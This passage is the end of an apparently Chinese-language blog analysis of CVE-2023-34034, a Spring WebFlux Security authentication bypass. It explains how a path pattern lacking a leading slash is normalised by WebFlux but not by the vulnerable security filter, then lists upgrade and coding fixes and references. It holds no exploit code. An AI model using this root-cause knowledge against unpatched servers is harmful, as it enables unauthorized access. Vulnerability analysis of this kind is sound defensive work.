-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822142906974.png" alt="image-20230822142906974"></p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143112720.png" alt="image-20230822143112720"></p>
-<p>该方法首先会解析element是否含有RequestMapping这个注解，element是一个Method对象。如果有再调用<code>createRequestMappingInfo</code>的重载方法。</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143204862.png" alt="image-20230822143204862"></p>
-<p>在该方法中首先会创建一个builder，其封装了RequestMapping设置的请求方法、路径、参数、请求头等条件，然后调用build方法准备构建一个<code>RequestMappingInfo</code>对象。</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143515644.png" alt="image-20230822143515644"></p>
-<p>注意到此时设置的路径匹配模式仍然没有发生变化，在调用parse方法后会发生什么？</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143646588.png" alt="image-20230822143646588"></p>
-<p>parse方法会判断路径匹配模式是否一”&#x2F;“开头，若不是则补充。如此便能正常地进行路径匹配，这与存在漏洞的Spring Security版本处理逻辑不同，故两者的差异导致了漏洞产生。</p>
-<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
-<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/spring-projects/spring-security/%EF%BC%9B">https://github.com/spring-projects/spring-security/；</a></li>
-<li>规范编码，避免不规范的路径匹配模式。</li>
-</ol>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034</a></li>
-<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-34034">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-34034</a></li>
-<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034</a></li>
-<li><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></li>
-<li><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></li>
-<li><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>漏洞分析</tag>
-        <tag>漏洞</tag>
-        <tag>WebFlux Security</tag>
-        <tag>CVE-2023-34034</tag>
-        <tag>认证绕过</tag>
       </tags>
   </entry>
   <entry>
